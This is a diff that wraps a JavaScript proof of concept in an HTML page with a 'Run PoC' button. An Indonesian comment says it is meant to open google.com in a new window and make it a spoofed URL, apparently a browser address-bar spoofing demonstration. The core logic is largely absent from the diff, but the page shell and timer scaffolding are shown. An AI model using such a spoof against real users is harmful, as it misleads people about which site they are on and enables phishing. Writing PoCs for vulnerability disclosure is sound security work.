@@ -1,4 +1,9 @@
-<script>
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Run PoC</button>
+
+    <script>
       function spoof() {
         // Buka page baru pointing ke target (akan menjadi spoofed URL)
         let win = window.open("https://www.google.com/", "_blank");
@@ -20,4 +25,6 @@
           }
         }, 50);
       }
-</script>
+    </script>
+  </body>
+</html>
